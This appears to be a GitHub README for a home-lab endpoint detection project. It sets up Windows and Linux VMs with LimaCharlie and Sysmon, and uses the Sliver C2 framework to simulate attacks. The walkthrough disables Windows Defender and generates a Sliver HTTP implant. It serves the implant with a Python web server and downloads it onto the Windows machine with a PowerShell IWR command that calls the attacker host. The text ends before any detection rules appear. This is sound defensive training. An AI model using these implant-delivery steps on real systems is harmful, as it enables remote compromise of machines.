<h1>Endpoint Detection and Response</h1>

 
 <h2>Description</h2>
In this Project, attacks are simulated using a virtual Windows and Linux machine and the attack is monitored, detected and blocked using the Endpoint Detection and Response agent
called LimaCharlie.Through LimaCharlie, simulated attacks are detected and blocked using detection/block rules.<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b> 
- <b>Command Line</b>
- <b>Sliver</b>
- <b>Sysmon</b>
- <b>LimaCharlie</b>
- <b>Secure Shell(SSH)</b>

<h2>Environments Used </h2>

- <b>VMware Workstation Pro 17</b>
- <b>Windows 11 Enterprise</b>
- <b>Linux Ubuntu(Server Version)</b> 


<h2>Project walk-through:</h2>

The setup for the VM environment consists of many steps.  For the detailed steps, a link is provided to Eric Capuano's blog <b>So you want to be a SOC Analyst?(Part1)</b> <a href=https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part>here</a>

The Summary of the VM Environment is as follows:
A.  Establishment of a Windows Virtual Machine with Windows Defender disabled/suppressed and
    and Sysmon installed. Sysmon will provide telemetry through LimaCharlie which is also installed
    on the Windows VM.

B.  Linux Virtual Machine (Ubuntu Server Version) with Sliver Command and Control framework installed.
    Sliver will be used to deliver malware to the Windows VM.

<p align="left"><b>Attack Monitor & Detection</b><br/>

1.  In Linux Machine:
    Drop into root shell and change directory to Sliver location--> cd /opt/sliver

2.  Launch Sliver C2 Agent-->sliver-server

     ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/df71e29b-f3c4-4ca1-a42d-ce608735378f)

3.  Generate C2 session payload with Sliver using Linux Machine’s IP address obtained during the establishment of the Virtual Machines mentioned above.

     --> generate --http  Linux IP Address --save /opt/sliver

    ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/5bdaed61-3a37-45bc-b754-ec40db806e76)

    Note that MASSIVE_DEPRESSIVE.EXE is the payload/implant name in my case.

4.  Within the opt/sliver directory, we use the following python script to execute a temporary server
    --> python3 -m http.server 80

5. Switch over to Windows Virtual Machine while server is established in Linux Machine
   and launch an Administrative PowerShell console

6. Within the Administrative Powershell Console we run the following command to simulate
   the downloading of the C2 payload from the Linux Attacker Machine.
   
   --> IWR -Uri http://Linux IP/payloadname.exe -Outfile C:\Users\User\Downloads\payloadname.exe


<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
